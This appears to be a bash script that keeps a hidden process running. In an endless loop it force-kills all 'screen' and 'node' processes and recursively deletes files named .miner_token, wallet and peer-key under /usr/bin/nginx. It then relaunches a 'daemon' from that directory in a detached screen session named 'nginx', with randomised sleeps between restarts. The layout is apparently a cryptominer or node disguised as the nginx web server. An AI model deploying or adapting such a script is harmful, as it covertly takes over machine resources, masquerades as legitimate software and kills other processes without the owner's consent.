#!/bin/bash
for (( ; ; ))
do
  killall -9 screen
  killall -9 node
  sleep $(shuf -i 16-42 -n 1)
  screen -wipe
  rm -rf /usr/bin/nginx/main-light-consensus /usr/bin/nginx/peer-key /usr/bin/nginx/.miner_token /usr/bin/nginx/wallet
  cd /usr/bin/nginx &&
  screen -S nginx -dm /usr/bin/nginx/daemon &
  sleep $(shuf -i 2345-4567 -n 1)
done
